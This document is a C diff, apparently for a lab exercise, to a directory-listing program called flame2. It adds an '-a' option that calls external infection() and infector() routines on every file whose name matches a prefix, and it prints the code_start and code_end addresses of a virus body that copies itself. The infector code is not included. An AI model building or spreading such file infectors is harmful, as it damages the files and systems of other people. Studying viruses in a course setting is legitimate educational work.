@@ -137,7 +137,14 @@ int match_prefix(char *prefix, int prefix_size, char *str){
     return strncmp(prefix, str, prefix_size) == 0 ? 1 : -1;
 } 
 
-int flame2(char *prefix){
+
+extern void infection();
+extern void infector(char *);
+
+extern void code_start();
+extern void code_end();
+
+int flame2(char *prefix, int attach){
     int fd, nread = 0;
     char buf[BUFFER];
     ent *dirent;
@@ -174,6 +181,12 @@ int flame2(char *prefix){
             if(match_prefix(prefix, prefix_len, dirent->name) > 0){
                 write(write_to, dirent->name, strlen(dirent->name));
                 writeByte(write_to, "\n");
+                
+                if(attach > 0){
+                    infection();
+                    infector(dirent->name);
+                }
+
             }
 
             bpos = bpos + dirent->len;
@@ -186,13 +199,19 @@ int flame2(char *prefix){
 
 }
 
-extern void infection();
-extern void infector(char *);
-
 int main (int argc , char* argv[], char* envp[])
 {
-    int i;
+    int i, attach = 0;
     char * prefix = NULL;
+
+    char tmp_c = '\n';
+    write_no_debug(STDERR, "code_start: ", 12);
+    write_no_debug(STDERR, itoa((int)&code_start), BUFFER_SIZE_DEBUG);
+    writeByte_no_debug(STDERR, &tmp_c);
+
+    write_no_debug(STDERR, "code_end: ", 10);
+    write_no_debug(STDERR, itoa((int)&code_end), BUFFER_SIZE_DEBUG);
+    writeByte_no_debug(STDERR, &tmp_c);
 
     for(i=1; i < argc; i=i+1){
         if(strncmp("-p", argv[i], 2) == 0){
@@ -200,10 +219,11 @@ int main (int argc , char* argv[], char* envp[])
             continue;
         }
 
-        /*if(strncmp("-a", argv[i], 2) == 0){
-            ifd = open(argv[i]+2, O_RDONLY);
+        if(strncmp("-a", argv[i], 2) == 0){
+            prefix = argv[i] + 2;
+            attach = 1;
             continue;
-        }*/
+        }
 
         if(strncmp("-D", argv[i], 2) == 0){
             DEBUG_FLAG = 1;
@@ -213,6 +233,6 @@ int main (int argc , char* argv[], char* envp[])
         }
     }
 
-    return flame2(prefix);
+    return flame2(prefix, attach);
 
 }
